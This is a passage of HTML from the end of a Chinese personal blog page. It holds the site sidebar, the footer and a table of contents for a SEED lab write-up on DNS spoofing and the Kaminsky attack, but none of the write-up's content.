src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SEEDLAB：网络嗅探攻击实验</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Enboy_Yu</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="xpand" style="height:200px;"><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas></div><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople1.js"></script><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/zdog.dist.js"></script><script id="rendered-js" src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople.js"></script><style>.card-widget.card-announcement {
margin: 0;
align-items: center;
justify-content: center;
text-align: center;
}
canvas {
display: block;
margin: 0 auto;
cursor: move;
}</style><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">一、    实验目的</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-overview"><span class="toc-number">1.1.</span> <span class="toc-text">1 overview</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%E5%8F%8A%E7%BB%93%E6%9E%9C"><span class="toc-number">2.</span> <span class="toc-text">二、    实验步骤及结果</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-DNS-Local"><span class="toc-number">2.1.</span> <span class="toc-text">2  DNS _Local</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E9%83%A8%E7%BD%B2"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">容器部署</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E6%94%BB%E5%87%BB%E8%80%85%E5%AE%B9%E5%99%A8"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">了解攻击者容器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-Shared-folder"><span class="toc-number">2.1.1.2.1.</span> <span class="toc-text">• Shared folder</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-Host-mode"><span class="toc-number">2.1.1.2.2.</span> <span class="toc-text">• Host mode</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">DNS配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E9%83%A8%E7%BD%B2"><span class="toc-number">2.1.1.4.</span> <span class="toc-text">测试部署</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-The-Attack-Tasks"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.2 The Attack Tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-1-Directly-Spoofing-Response-to-User"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">Task 1: Directly Spoofing Response to User</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-2-DNS-Cache-Poisoning-Attack-%E2%80%93-Spoofing-Answers"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">Task 2: DNS Cache Poisoning Attack – Spoofing Answers</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-3-Spoofing-NS-Records"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">Task 3: Spoofing NS Records</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-4-Spoofing-NS-Records-for-Another-Domain"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">Task 4: Spoofing NS Records for Another Domain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-5-Spoofing-Records-in-the-Additional-Section"><span class="toc-number">2.1.2.5.</span> <span class="toc-text">**Task 5: Spoofing Records in the Additional Section **</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-DNS-Remote"><span class="toc-number">2.2.</span> <span class="toc-text">3 DNS_Remote</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.2.1.</span> <span class="toc-text">3.1 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-The-Attack-Tasks"><span class="toc-number">2.2.2.</span> <span class="toc-text">3.2 The Attack Tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-1-The-Kaminsky-Attack"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">Task 1:The Kaminsky Attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-2-Construct-DNS-request"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">Task 2: Construct DNS request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-3-Spoof-DNS-Replies"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">Task 3: Spoof DNS Replies</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-4-Launch-the-Kaminsky-Attack"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">Task 4: Launch the Kaminsky Attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Task-5-Result-Verification"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">Task 5: Result Verification</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/88a94389.html" title="SEEDLAB：缓存攻击实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：缓存攻击实验"/></a><div class="content"><a class="title" href="/post/88a94389.html" title="SEEDLAB：缓存攻击实验">SEEDLAB：缓存攻击实验</a><time datetime="2024-01-31T08:48:54.810Z" title="发表于 2024-01-31 16:48:54">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/82027ba8.html" title="SEEDLAB：MD5碰撞实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：MD5碰撞实验"/></a><div class="content"><a class="title" href="/post/82027ba8.html" title="SEEDLAB：MD5碰撞实验">SEEDLAB：MD5碰撞实验</a><time datetime="2024-01-31T08:46:53.792Z" title="发表于 2024-01-31 16:46:53">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/f52b3abf.html" title="SEEDLAB：幽灵攻击实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：幽灵攻击实验"/></a><div class="content"><a class="title" href="/post/f52b3abf.html" title="SEEDLAB：幽灵攻击实验">SEEDLAB：幽灵攻击实验</a><time datetime="2024-01-31T06:12:11.281Z" title="发表于 2024-01-31 14:12:11">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/4aa986b5.html" title="SEEDLAB：DNS欺骗实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：DNS欺骗实验"/></a><div class="content"><a class="title" href="/post/4aa986b5.html" title="SEEDLAB：DNS欺骗实验">SEEDLAB：DNS欺骗实验</a><time datetime="2024-01-31T06:11:38.662Z" title="发表于 2024-01-31 14:11:38">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/4f4694a6.html" title="SEEDLAB：网络嗅探攻击实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：网络嗅探攻击实验"/></a><div class="content"><a class="title" href="/post/4f4694a6.html" title="SEEDLAB：网络嗅探攻击实验">SEEDLAB：网络嗅探攻击实验</a><time datetime="2024-01-31T06:11:05.377Z" title="发表于 2024-01-31 14:11:05">2024-01-31</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Enboy_Yu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":20,"vOffset":-20},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>